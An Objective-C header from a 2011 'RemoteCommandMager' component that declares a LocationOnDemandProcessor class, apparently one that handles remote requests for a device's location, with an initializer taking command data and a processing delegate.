/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  LocationOnDemandProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  21/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncNonHTTPProcessor.h"
#import "LocationManagerDelegate.h"

@class LocationManagerImpl;

@interface LocationOnDemandProcessor : RemoteCmdAsyncNonHTTPProcessor <LocationManagerDelegate> {
@private
	LocationManagerImpl   *mlocManagerImpl;
}

//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
